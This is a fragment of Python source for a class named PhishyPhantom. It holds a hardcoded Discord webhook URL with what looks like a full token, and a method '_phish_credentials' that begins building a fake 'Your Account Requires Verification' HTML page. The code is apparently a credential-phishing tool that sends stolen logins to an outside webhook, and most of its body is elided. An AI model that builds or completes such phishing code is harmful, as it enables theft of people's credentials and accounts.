...
class PhishyPhantom:
    def __init__(self):
        self.webhook_url = "https://discord.com/api/webhooks/1403896533489025095/6TTtZVRLATLi8h5excj_HdaRTr5ERJXfyYCOGAVSExp_wSCohfOUBtZdmWq3-OHbt3rp"  # Replace with your webhook
    ...
    def _phish_credentials(self):
        ...
        <html>
        <body>
            <h1>⚠️ Your Account Requires Verification</h1>
